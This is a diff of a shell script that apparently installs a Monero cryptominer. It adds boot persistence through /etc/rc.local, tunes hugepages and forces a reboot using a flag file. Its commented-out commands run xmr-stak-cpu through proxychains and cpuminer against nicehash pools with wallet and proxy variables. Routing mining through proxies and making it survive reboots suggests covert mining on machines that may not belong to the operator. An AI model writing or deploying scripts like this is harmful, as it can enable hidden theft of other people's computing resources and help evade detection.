@@ -18,10 +18,25 @@ sudo chmod +x /m/test01/ax.sh
 sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
 sudo sed -i -e "/m/test01/ax.sh" /etc/rc.local
 
+file="/m/test01/flag"
+if [ -f "$file" ]
+then
+  exit
+else
+  sudo /bin/su -c "echo 'xxxxx' >> /m/test01/flag"
+  sudo reboot  
+fi
+
+
+
+
+
+
+
 #while true; do
 #cd /m/test01/xmr/
 #sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-sudo reboot
+
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
 #done
